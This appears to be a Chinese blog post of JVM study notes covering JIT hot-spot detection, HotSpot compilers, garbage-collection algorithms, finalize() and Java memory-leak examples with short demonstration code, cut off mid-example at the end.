<p>JIT的热点代码：被多次调用的方法或方法内的循环体，编译的目标都是整个方法，而不是方法内某部分热点代码。由于这种编译方式发生在方法的执行过程中，因此也被叫做栈上替换，简称OSR（On Stack Replacement）编译。</p>
<p>热点探测判断：</p>
<ul>
<li><p>基于采样的热点探测（Sample Based Hot Spot Code Detection）。采用这种方法的虚拟机会周期性地检查各个线程的调用栈顶，如果发现某个（或某些）方法经常出现在栈顶，那这个方法就是“热点方法”。（J9采用）</p>
<ul>
<li>优点：基于采样的热点探测的好处是实现简单高效，还可以很容易地获取方法调用关系（将调用堆栈展开即可）。</li>
<li>缺点：很难精确地确认一个方法的热度，容易因为受到线程阻塞或别的外界因素的影响而扰乱热点探测。</li>
</ul>
</li>
<li><p>基于计数器的热点探测（Counter Based Hot Spot Code Detection）。采用这种方法的虚拟机会为每个方法（甚至是代码块）建立计数器，统计方法的执行次数，如果执行次数超过一定的阈值就认为它是“热点方法”。（HotSpot采用）</p>
<ul>
<li>优点：统计结果相对来说更加精确严谨。</li>
<li>缺点：实现起来更麻烦，需要为每个方法建立并维护计数器，而且不能直接获取到方法的调用关系。</li>
</ul>
</li>
</ul>
<p>HotSpot的热点探测计数器：</p>
<ul>
<li>方法调用计数器：统计方法被调用的次数，默认情况下，Client模式是1500次，Server模式是10000次。超过这个阈值（可通过-XX:CompileThreshold设定），就会触发JIT编译。当一个方法被调用时，虚拟机会先检查该方法是否存在被即时编译过的版本，如果存在，则优先使用编译后的本地代码来执行。如果不存在已被编译过的版本，则将该方法的调用计数器值加一，然后判断方法调用计数器与回边计数器值之和是否超过方法调用计数器的阈值。一旦已超过阈值的话，将会向即时编译器提交一个该方法的代码编译请求。</li>
<li>回边计数器</li>
</ul>
<p>热度衰减：在默认设置下，方法调用计数器统计的并不是方法被调用的绝对次数，而是一个相对的执行频率，即一段时间之内方法被调用的次数。当超过一定的时间限度，如果方法的调用次数仍然不足以让它提交给即时编译器编译，那该方法的调用计数器就会被减少一半，这个过程被称为方法调用计数器热度的衰减（Counter Decay），而这段时间就称为此方法统计的半衰周期（Counter Half Life Time），进行热度衰减的动作是在虚拟机进行垃圾收集时顺便进行的，可以使用虚拟机参数-XX:-UseCounterDecay来关闭热度衰减，让方法计数器统计方法调用的绝对次数，这样只要系统运行时间足够长，程序中绝大部分方法都会被编译成本地代码。另外还可以使用-XX:CounterHalfLifeTime参数设置半衰周期的时间，单位是秒。</p>
<p>HotSpot虚拟机中内置的两个（或三个）即时编译器（由-XX:+RewriteFrequentPairs参数控制，默认server模式。）：</p>
<ul>
<li><p>“客户端编译器”（Client Compiler），简称为C1编译器。可通过-client参数指定，特点：耗时短，优化简单可靠；启动快，占用内存小，执行效率比server慢，默认情况下不进行动态编译，适合桌面应用。优化策略：</p>
<ul>
<li>方法内联：将引用的函数代码编译到引用点处，可以减少栈帧的生成，减少参数传递以及跳转过程。</li>
<li>去虚拟化：对唯一的实现类进行内联。</li>
<li>冗余消除：在运行期间把一些不会执行的代码折叠掉。</li>
</ul>
</li>
<li><p>“服务端编译器”（Server Compiler），简称为C2编译器。可通过-server参数指定，特点：耗时长，优化更为激进，但优化的代码执行效率更高；启动慢，占用内存多，效率高，适合服务端应用。优化策略（基于逃逸分析）：</p>
<ul>
<li>标量替换：用标量值代替聚合对象的属性值。</li>
<li>栈上分配：对未逃逸的对象，内存分配在栈而不在堆。</li>
<li>同步消除：消除同步操作，通常指synchronized。</li>
</ul>
</li>
<li><p>Graal编译器，JDK 10时才出现的、长期目标是代替C2，目前还处于实验状态。</p>
<p>总结：一般来说，JIT编译出来的机器码性能比解释器高；C2编译器启动较C1编译器慢，系统稳定执行后，C2编译器速度远快于C1编译器。</p>
</li>
</ul>
<h1 id="6-垃圾回收"><a href="#6-垃圾回收" class="headerlink" title="6. 垃圾回收"></a>6. 垃圾回收</h1><p>垃圾的定义：运行程序中没有任何指针指向的对象。</p>
<p>为什么需要GC：如果不及时对内存中的垃圾进行清理，那么这些垃圾对象所占用的内存空间会一直保留到应用程序结束，被保留的空间无法被其他对象使用，甚至可能内存溢出。</p>
<p>GC的区域：堆（新生代GC频率高，老年代GC频率低）、方法区（GC频率极低）。</p>
<h2 id="6-1-垃圾判定算法"><a href="#6-1-垃圾判定算法" class="headerlink" title="6.1 垃圾判定算法"></a>6.1 垃圾判定算法</h2><h3 id="6-1-1-引用计数法"><a href="#6-1-1-引用计数法" class="headerlink" title="6.1.1 引用计数法"></a>6.1.1 引用计数法</h3><p>在对象中添加一个引用计数器，每当有一个地方引用它时，计数器值就加一；当引用失效时，计数器值就减一。</p>
<ul>
<li>优点：原理简单，判定效率高，回收没有延迟。</li>
<li>缺点：占用额外的内存空间来进行计数；无法处理循环引用的问题。（若非要使用这种算法，可在适当的适合手动解除或使用弱引用。）</li>
</ul>
<h3 id="6-1-2-可达性分析"><a href="#6-1-2-可达性分析" class="headerlink" title="6.1.2 可达性分析"></a>6.1.2 可达性分析</h3><p>一系列的“GC Roots”根对象，根据引用关系向下搜索，搜索过程所走过的路径称为“引用链”（Reference Chain）。如果某个对象到GC Roots间没有任何引用链相连，说明从GC Roots到这个对象不可达，则此对象是不可能再被使用的。（Java采用的是可达性分析）</p>
<ul>
<li>优点：有效解决引用计数法无法处理循环引用的问题。</li>
</ul>
<p>GC Roots的对象包括（查找所有GC Roots的过程称为枚举根节点）：</p>
<ol>
<li><p>虚拟机栈（栈帧中的局部变量表）中引用的对象，比如：各个线程被调用的方法中使用到的参数、局部变量等。</p>
</li>
<li><p>类静态属性引用的对象，比如：Java类的引用类型静态变量。</p>
</li>
<li><p>方法区中常量引用的对象，比如：字符串常量池（String Table）里的引用。</p>
</li>
<li><p>本地方法栈中JNI（即通常所说的Native方法）引用的对象。</p>
</li>
<li><p>Java虚拟机内部的引用，比如：基本数据类型对应的Class对象，一些常驻的异常对象（NullPointExcepiton、OutOfMemoryError）等，还有系统类加载器。</p>
</li>
<li><p>所有被同步锁（synchronized关键字）持有的对象。</p>
</li>
<li><p>反映Java虚拟机内部情况的JMXBean、JVMTI中注册的回调、本地代码缓存等。</p>
</li>
<li><p>除了这些固定的GC Roots集合以外，根据用户所选用的垃圾收集器以及当前回收的内存区域不同，还可以有其他对象“临时性”地加入，共同构成完整GC Roots集合。比如：分代收集和局部回收（Partial GC），如果只针对Java堆中某一块区域发起垃圾收集时（比如：最典型的只针对新生代的垃圾收集），必须考虑到内存区域是虚拟机自己的实现细节（在用户视角里任何内存区域都是不可见的），更不是孤立封闭的，所以某个区域里的对象完全有可能被位于堆中其他区域的对象所引用，这时候就需要将这些关联区域的对象也一并加入GC Roots集合中去，才能保证可达性分析的正确性。</p>
<p>总结：如果一个指针指向了堆中的对象，而自身又不存放在堆中，则它就是一个GC Roots。</p>
</li>
</ol>
<hr>
<p>并发的可达性分析：用户线程和垃圾收集线程并发执行，目的是缩短用户线程停顿时间。在可达性分析的对象图中：</p>
<ul>
<li>白色：未被垃圾收集器访问过的对象。可达性分析的开始阶段，所有的对象都是白色的，若在分析结束的阶段，仍然是白色的，则代表不可达。</li>
<li>黑色：被垃圾收集器访问过的对象，且这个对象的所有引用都已经扫描过，是安全存活的。如果其他对象引用指向了黑色对象，无须重新扫描一遍。黑色对象与白色对象之间一定存在灰色对象。</li>
<li>灰色：被垃圾收集器访问过的对象，但这个对象上至少存在一个引用还没被扫描。</li>
</ul>
<p>并发的可达性分析会出现以下2个问题：</p>
<ul>
<li><p>浮动垃圾：初始标记阶段为存活对象，重新标记为垃圾对象。这种情况可以接受，留到下次GC时清理。</p>
</li>
<li><p>对象消失：初始标记阶段为垃圾对象，重新标记为存活对象。Wilson于1994年在理论上证明了，当且仅当以下两个条件同时满足时，会产生“对象消失”的问题，即原本应该是黑色的对象被误标为白色：①赋值器插入了一条或多条从黑色对象到白色对象的新引用；②赋值器删除了全部从灰色对象到该白色对象的直接或间接引用。有如下2种解决方案：</p>
<ul>
<li><p>增量更新（Incremental Update）：增量更新要破坏的是第一个条件，当黑色对象插入新的指向白色对象的引用关系时，就将这个新插入的引用记录下来，等并发扫描结束之后，再将这些记录过的引用关系中的黑色对象为根，重新扫描一次。这可以简化理解为，黑色对象一旦新插入了指向白色对象的引用之后，它就变回灰色对象了。</p>
</li>
<li><p>原始快照（Snapshot At The Beginning， SATB）：原始快照要破坏的是第二个条件，当灰色对象要删除指向白色对象的引用关系时，就将这个要删除的引用记录下来，在并发扫描结束之后，再将这些记录过的引用关系中的灰色对象为根，重新扫描一次。这也可以简化理解为，无论引用关系删除与否，都会按照刚刚开始扫描那一刻的对象图快照来进行搜索。</p>
<p>以上无论是对引用关系记录的插入还是删除，虚拟机的记录操作都是通过写屏障实现的。在 HotSpot虚拟机中，增量更新和原始快照这两种解决方案都有实际应用，比如：CMS是基于增量更新来做并发标记的，G1、Shenandoah则是用原始快照来实现。</p>
</li>
</ul>
</li>
</ul>
<h2 id="6-2-垃圾回收算法"><a href="#6-2-垃圾回收算法" class="headerlink" title="6.2 垃圾回收算法"></a>6.2 垃圾回收算法</h2><h3 id="6-2-1-标记-清除算法（Mark-Sweep）"><a href="#6-2-1-标记-清除算法（Mark-Sweep）" class="headerlink" title="6.2.1 标记-清除算法（Mark-Sweep）"></a>6.2.1 标记-清除算法（Mark-Sweep）</h3><p>分为“标记”和“清除”两个阶段，它是最基础的收集算法，后续的收集算法大多都以它为基础，对其缺点进行改进而得到的。标记过程就是垃圾的判定过程，是否可达记录在对象头：</p>
<ul>
<li><p>方法一：标记需要回收的对象，统一回收所有被标记的对象。</p>
</li>
<li><p>方法二：标记存活的对象，统一回收所有未被标记的对象。</p>
</li>
</ul>
<p>缺点：</p>
<ul>
<li>执行效率不稳定，标记和清除两个过程的执行效率都随对象数量增加而降低。</li>
<li>会产生内存碎片，导致在较大对象内存分配时，可能无法找到足够的连续内存而提前触发GC。</li>
</ul>
<p>注意：清除不是真的清空，而是把需要清除的对象地址保存在空闲列表里，下次对象内存分配时，若空间足够，则直接覆盖。</p>
<h3 id="6-2-2-复制算法（Copying）"><a href="#6-2-2-复制算法（Copying）" class="headerlink" title="6.2.2 复制算法（Copying）"></a>6.2.2 复制算法（Copying）</h3><p>将可用内存按容量划分为大小相等的两块，每次只使用其中的一块。当这一块的内存用完了，就将还存活着的对象复制到另外一块上面，然后再把已使用过的内存空间一次清理掉。</p>
<p>优点：</p>
<ul>
<li>不会产生内存碎片。</li>
</ul>
<p>缺点：</p>
<ul>
<li>可用内存缩小为了原来的一半。</li>
<li>如果内存中多数对象都是存活的，会产生大量的内存间复制的开销。适用于对象存活率低的情况，比如：新生代的垃圾回收。</li>
</ul>
<h3 id="6-2-3-标记-整理算法（Mark-Compact）"><a href="#6-2-3-标记-整理算法（Mark-Compact）" class="headerlink" title="6.2.3 标记-整理算法（Mark-Compact）"></a>6.2.3 标记-整理算法（Mark-Compact）</h3><p>它的标记过程与“标记-清除”算法一样，后续让所有存活的对象都向内存空间一端移动，然后直接清理掉边界以外的内存。</p>
<p>优点：</p>
<ul>
<li>不会产生内存碎片。</li>
<li>可用内存不用缩小为了原来的一半。</li>
</ul>
<p>缺点：</p>
<ul>
<li>对于老年代这种对象存活率较高的情况，移动存活对象并更新它的引用是极为负重的。STW时间也比其它两种长。</li>
</ul>
<p>三种算法对比：</p>
<table>
<thead>
<tr>
<th>维度</th>
<th>标记-清除算法</th>
<th>复制算法</th>
<th>标记-整理算法</th>
</tr>
</thead>
<tbody><tr>
<td>速度</td>
<td>中等</td>
<td>最快</td>
<td>最慢</td>
</tr>
<tr>
<td>空间</td>
<td>少（会产生内存碎片）</td>
<td>通常需要存活对象的2倍大小（不会产生内存碎片）</td>
<td>少（不会产生内存碎片）</td>
</tr>
<tr>
<td>是否移动对象</td>
<td>否</td>
<td>是</td>
<td>是</td>
</tr>
</tbody></table>
<h3 id="6-2-4-分代收集算法"><a href="#6-2-4-分代收集算法" class="headerlink" title="6.2.4 分代收集算法"></a>6.2.4 分代收集算法</h3><p>不同生命周期的对象采用不同的收集算法，以提高垃圾回收的效率。目前几乎所有的GC都采用分代收集算法（Generational Collecting）来执行垃圾回收，且几乎所有的垃圾收集器都区分新生代和老年代。</p>
<p>新生代：</p>
<ul>
<li>特点：区域较小、对象存活率低、回收频率较高。</li>
<li>具体算法：复制算法。</li>
</ul>
<p>老年代：</p>
<ul>
<li>特点：区域较大、对象存活率高、回收频率较低。</li>
<li>具体算法：标记-清除或标记-清除与标记-整理混用。比如：主打低延迟的CMS收集器，多数时间采取标记-清除算法，当内存碎片程度影响到对象分配时，再采用标记-整理算法收集一次，以获得规整的内存空间。</li>
</ul>
<h3 id="6-2-5-增量收集算法"><a href="#6-2-5-增量收集算法" class="headerlink" title="6.2.5 增量收集算法"></a>6.2.5 增量收集算法</h3><p>增量收集算法（Incremental Collecting）：为解决垃圾回收时间长导致程序暂停过久的问题。垃圾收集线程每次只收集一小片区域的内存空间，接着切换到应用程序线程。依次反复，直到垃圾收集完成。</p>
<p>优点：低延迟。</p>
<p>缺点：吞吐量下降。</p>
<h3 id="6-2-6-分区收集算法"><a href="#6-2-6-分区收集算法" class="headerlink" title="6.2.6 分区收集算法"></a>6.2.6 分区收集算法</h3><p>将整个堆空间划分成连续的不同小区间，每个小区间独立使用、独立回收。通过控制每次回收的区间数量，来控制GC的停顿时长，比如：G1收集器。</p>
<h2 id="6-3-gc-与finalize"><a href="#6-3-gc-与finalize" class="headerlink" title="6.3 gc()与finalize()"></a>6.3 gc()与finalize()</h2><p>gc()：</p>
<ul>
<li>System.gc()，内部通过Runtime.getRuntime().gc()实现。显式触发Full GC，但不确定是否马上执行。一般情况下，垃圾回收应该是自动进行，无须显式触发。在特殊的性能基准测试时，可能会用到。（测试前调用）</li>
</ul>
<p>finalize()：</p>
<ul>
<li>Object的finalize()方法。被重写的finalize()方法，在对象被首次回收前，由于系统调用，但对象不一定会被回收掉，后续的回收不再调用此方法（关键点：重写、首次）。可用做“关闭外部资源”之类的清理性工作，但如今已被官方明确声明为不推荐使用的语法，使用try-finally或其它方式替换。</li>
<li>详细：如果这个对象被判定为确有必要执行finalize()方法，那么该对象将会被放置在一个名为F-Queue的队列之中，并在稍后由一条由虚拟机自动建立的、低调度优先级的Finalizer线程去执行它们的finalize()方法。这里所说的“执行”是指虚拟机会触发这个方法开始运行，但并不承诺一定会等待它运行结束。这样做的原因是，如果某个对象的finalize()方法执行缓慢，或者更极端地发生了死循环，将很可能导致F-Queue队列中的其他对象永久处于等待，甚至导致整个内存回收子系统的崩溃。finalize()方法是对象逃脱死亡命运的最后一次机会，稍后收集器将对F-Queue中的对象进行第二次小规模的标记，如果对象要在finalize()中成功拯救自己——只要重新与引用链上的任何一个对象建立关联即可，比如：把自己（this关键字）赋值给某个类变量或者对象的成员变量，那在第二次标记时它将被移出“即将回收”的集合；如果对象这时候还没有逃脱，那基本上它就真的要被回收了。如下代码案例：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GCTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">GCTest</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        obj = <span class="keyword">new</span> <span class="title class_">GCTest</span>();</span><br><span class="line">        obj = <span class="literal">null</span>;</span><br><span class="line">        System.gc();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 强制调用重写的finalize()方法。通过Runtime.getRuntime().runFinalization()实现。</span></span><br><span class="line">        <span class="comment">// System.runFinalization();</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 二次回收</span></span><br><span class="line">        obj = <span class="literal">null</span>;</span><br><span class="line">        System.gc();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.finalize();</span><br><span class="line">        System.out.println(<span class="string">&quot;GCTest.finalize&quot;</span>);</span><br><span class="line">        obj = <span class="built_in">this</span>;     <span class="comment">// 模拟没有被回收掉，进行二次回收的情况。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="6-4-内存溢出与内存泄漏"><a href="#6-4-内存溢出与内存泄漏" class="headerlink" title="6.4 内存溢出与内存泄漏"></a>6.4 内存溢出与内存泄漏</h2><h3 id="6-4-1-内存溢出"><a href="#6-4-1-内存溢出" class="headerlink" title="6.4.1 内存溢出"></a>6.4.1 内存溢出</h3><p>内存空间不足，并且垃圾收集器也无法提供更多的内存。具体OOM（通常在它之前有一次GC）情况：</p>
<ol>
<li>方法区空间不足。（加载过多的类）</li>
<li>堆空间不足。</li>
<li>虚拟机栈空间不足。（没有足够的内存去创建对应的虚拟机栈）</li>
<li>本地方法栈空间不足。（没有足够的内存去创建对应的本地方法栈）</li>
</ol>
<h3 id="6-4-2-内存泄漏"><a href="#6-4-2-内存泄漏" class="headerlink" title="6.4.2 内存泄漏"></a>6.4.2 内存泄漏</h3><p>不再被使用的对象，却仍然存在于内存中（逻辑上不再被使用的可达对象）。具体有如下情况：</p>
<h4 id="1）静态集合类"><a href="#1）静态集合类" class="headerlink" title="1）静态集合类"></a>1）静态集合类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tst1</span> &#123;</span><br><span class="line">    <span class="comment">// 静态集合类属性占用内存会越来越大，生命周期与JVM一样。</span></span><br><span class="line">    <span class="keyword">static</span> List&lt;String&gt; strList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        strList.add(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2）单例模式"><a href="#2）单例模式" class="headerlink" title="2）单例模式"></a>2）单例模式</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tst2</span> &#123;</span><br><span class="line">    <span class="comment">// 与静态集合类的情况类似，生命周期与JVM一样。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">Tst2</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Tst2</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Tst2 <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Tst2.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Tst2</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3）非静态内部类持有外部类"><a href="#3）非静态内部类持有外部类" class="headerlink" title="3）非静态内部类持有外部类"></a>3）非静态内部类持有外部类</h4><p>非静态内部类对象持有外部类对象的引用，解决办法：改为静态内部类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tst3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;Tom&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Inner</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Inner <span class="title function_">inner</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="built_in">super</span>.finalize();</span><br><span class="line">        System.out.println(<span class="string">&quot;Tst3.finalize&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Tst3Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Tst3</span> <span class="variable">tst3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tst3</span>();</span><br><span class="line">        Tst3.<span class="type">Inner</span> <span class="variable">inner</span> <span class="operator">=</span> tst3.inner();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 外部类引用置为null，并且显式GC。</span></span><br><span class="line">        tst3 = <span class="literal">null</span>;</span><br><span class="line">        System.gc();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            TimeUnit.MILLISECONDS.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非静态内部类对象通过this$0属性引用外部类对象，导致外部类无法被回收，所以它的finalize()方法也不会被调用。</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">$0</span> <span class="operator">=</span> Tst3.Inner.class.getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">        System.out.println(((Tst3) $<span class="number">0.</span>get(inner)).name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="4）各种资源连接"><a href="#4）各种资源连接" class="headerlink" title="4）各种资源连接"></a>4）各种资源连接</h4><p>比如：数据库连接、网络连接、IO连接等。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tst4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;D:/abc.txt&quot;</span>));</span><br><span class="line">            <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (reader != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 手动关闭连接，避免内存泄漏。</span></span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="5）变量不合理的作用域"><a href="#5）变量不合理的作用域" class="headerlink" title="5）变量不合理的作用域"></a>5）变量不合理的作用域</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tst5</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String msg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handle</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//        String msg;     // 参数从方法内不合理的调整到方法外，导致msg生命周期与tst5一样。</span></span><br><span class="line">        msg = getMsgFromRemote();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getMsgFromRemote</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;info&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="6）改变哈希值"><a href="#6）改变哈希值" class="headerlink" title="6）改变哈希值"></a>6）改变哈希值</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Tst6</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> (Stu) o;</span><br><span class="line">            <span class="keyword">return</span> Objects.equals(name, stu.name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Objects.hash(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Stu&#123;&quot;</span> +</span><br><span class="line">                    <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                    <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Set&lt;Stu&gt; stuSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        stuSet.add(stu1);</span><br><span class="line">        stuSet.add(stu2);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * HashSet、HashMap的remove方法会先计算key的Hash值（与HashCode相关）。重写了元素类的hashCode和equals，</span></span><br><span class="line"><span class="comment">         * 并且修改了影响hashCode的属性值，导致计算出的Hash值发生了改变，最终导致元素无法移除。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        stu1.setName(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        stuSet.remove(stu1);</span><br><span class="line"></span><br><span class="line">        System.out.println(stuSet);</span><br><span class="line">    